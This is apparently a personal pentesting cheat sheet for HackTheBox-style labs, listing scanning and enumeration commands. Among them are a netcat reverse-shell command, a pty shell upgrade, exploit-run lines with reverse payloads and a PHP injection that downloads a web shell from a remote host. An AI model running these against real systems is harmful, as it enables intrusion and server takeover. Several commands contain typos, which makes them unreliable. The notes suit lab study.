# don-t-forget
For us to easily remember the things we forgot
netcad 
nc -nvlp port for listening ports wich is we wanna use that
next type id next ls or pwd
nc -e /bin/bash host ip and port when we enter system 
nmap:
nmap -sS -A -v -p --min-rate 10000 host 
nmap -p- -sV port scanning ant its version
nmap -sV -sC -v From your scans, what version is FTP running on the target?
nmap -sS -p- -Pn --min-rate host ip for            to find all open ports
nmap -sC -sV -p htb
 nmap --script vuln -A 10.129.123.49 for finding all vulnerablitie

for finding specific ports 
1) nmap -p- --min-rate 10000 -oA nmap/allports -v 10.129.95.166
2)nmap -sC -sV   -p 22,80 10.129.95.166 






when the site open u must use /robots.txt
/cgi-bin/
/cgi-bin/user.sh

gobuster:
gobuster dir -u http://host -w /usr/share/worldlists/dirbuster/directory-list-2.3-medium.txt -x .ph,.txt,.conf,.doc,.sh
gobuster  dir -u  http://10.129.123.49 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster.log -t 50


nikto -h host

searcsploit (shell shock) -m
vim (payload extension)

if u have a payload for ex
python 34900.py rhost=ip(host) lhost=ip(host) payload=reverse(or bind)

we can compile exploit wirth gcc
gcc -o exploit 44298.c 
and ls 


python -m SimpleHTTPServer 80

chmod +x exploit for giving a permission(x using execute)

msfconsole
set rpath /cgi-bin/user.sh

sudo -l say to us u can run this commands

xkcd for explain vuln with nice comic



wpscan --url http://10.129.96.68 -e u,p --plugins-detection aggressive 


wget for upload shell

sudo -u scriptmanager /bib/bash this means u get a scriptmanager rank

next time ls -la shows to us permission  




ngrok, plink,bitvise,chisel for connectintions 





dnszone using:
dig -t NS(name server)
dig axfr @nameserver nameserver

nslookup for finding nameserver

check the command injection

 python upgrade shell       python -c 'import pty; pty.spawn("/bin/bash")'
 
 ctrl u (for inspect source)
 
 ubuntu apache  2.2.22 precision for finding last ubuntu update
 and next gonna here  from mozilla: ubuntu release precise
 
 
cURL
cURL is a command-line tool to transfer data to or from a server, using any of the supported protocols (HTTP, FTP, IMAP, POP3, SCP, SFTP, SMTP, TFTP, TELNET, LDAP, or FILE). curl is powered by Libcurl. This tool is preferred for automation since it is designed to work without user interaction. curl can transfer multiple files at once. 

curl -X POST -F `file=index.php(it s changgable and it gives us a databse)(for configuration root    /var/www/phpmy/config.php.inc)` http://192.168.1.1(IP adres of ur page)/test.php(it s subdomain for this box)


eval exploit for inputs
Insertion of a distant code in the vulnerable website
<?php $z=fopen("shell.php",'w');fwrite($z,file_get_contents("http://[website]/shell.txt"));fclose($z); ?>
